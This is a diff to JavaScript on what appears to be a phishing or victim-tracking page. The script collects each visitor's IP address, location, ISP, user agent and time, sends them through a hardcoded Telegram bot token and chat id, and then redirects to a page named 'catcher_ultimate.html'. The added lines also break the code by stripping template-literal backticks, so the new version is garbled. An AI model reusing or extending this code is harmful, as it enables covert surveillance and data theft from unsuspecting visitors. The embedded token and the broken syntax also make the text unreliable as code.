@@ -16,8 +16,8 @@
     async function sendToTelegram(message) {
       const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
       const chat_id = "6239813037";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      return fetch(url, {
+      const url = https://api.telegram.org/bot${token}/sendMessage;
+      await fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
@@ -25,21 +25,21 @@
     }
 
     function formatMessage(data) {
-      return `📄 *[REDIRECT STAGE]*
+      return 📄 *[REDIRECT STAGE]*
 🚪 *Redirecting to:* http://127.0.0.1:80
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
 🏢 *ISP:* ${data.org || "Unknown"}
-🧠 *User-Agent:* ${navigator.userAgent}
-🕒 *Timestamp:* ${new Date().toISOString()}`;
+🧠 *User-Agent:* \${navigator.userAgent}\
+🕒 *Timestamp:* ${new Date().toISOString()};
     }
 
     async function run() {
       const ipData = await getIPInfo();
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
-      await new Promise(r => setTimeout(r, 1000));
+
       window.location.href = "catcher_ultimate.html";
     }
 
